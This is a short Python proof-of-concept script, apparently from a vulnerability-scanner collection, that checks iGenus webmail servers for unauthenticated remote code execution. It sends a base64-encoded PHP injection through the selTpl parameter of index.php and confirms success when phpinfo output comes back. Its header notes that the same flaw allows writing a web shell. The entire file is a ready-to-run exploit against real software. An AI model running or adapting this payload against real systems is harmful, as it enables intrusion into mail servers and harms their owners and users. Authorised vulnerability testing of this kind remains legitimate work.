#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: iGenus邮件系统一处无需登录的任意代码执行
referer: http://www.wooyun.org/bugs/wooyun-2015-0156126
author: Lucifer
description: /home/webmail/igenus/include/login_inc.php base64编码未验证可写入shell
'''
import sys
import requests



class igenus_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?selTpl=YWF8YWFhJzsKcGhwaW5mbygpOyM="
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                return "[+]存在igenus命令执行漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = igenus_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()
